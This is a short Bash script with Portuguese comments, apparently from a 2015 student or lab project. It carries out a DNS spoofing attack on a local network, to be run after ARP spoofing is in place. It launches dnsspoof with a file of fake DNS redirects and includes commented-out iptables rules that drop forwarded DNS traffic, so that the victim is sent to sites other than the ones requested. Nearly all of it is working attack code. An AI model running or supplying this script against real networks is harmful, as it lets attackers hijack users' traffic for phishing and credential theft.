#!/bin/bash
#
# dnsspoofing-v1.sh
#
# Com o ARP Spoofing funcionando, esse script irá descartar
# todos os pacotes UDP e TCP com destino a porta 53 e irá
# realizar um ataque de DNS spoofing redirecionando o alvo
# para sites diferentes dos requisitos.
#
# Daniel Tomm
# Gabriel Richter
#
#
# Data Criacao:		22-09-2015
# Data Modificacao:	29-09-2015
#

# Atribui variavel com modo de uso
use="USO: $0 [interface] [arquivo host]

	Onde:
	[interface] - nome da interface de rede utilizada
	[Arquivo Host] - arquivo que contem os redirecionamentos DNS
	
	Exemplo de uso:
	$0 eth0 arquivo.host
"

# Se não recebeu 3 parametros finaliza script
if [ $# != 2 ]
then
	echo "$use";
	exit 1;
fi

# Recebe parametros
interface=$1
host=$2

# Bloqueia solicitação DNS porta udp e tcp
#iptables -A FORWARD -p udp --dport 53 -j DROP
#iptables -A FORWARD -p tcp --dport 53 -j DROP

# Realiza o dns spoofing propriamente dito
xterm -e "dnsspoof -i $interface -f $host" &

exit 0
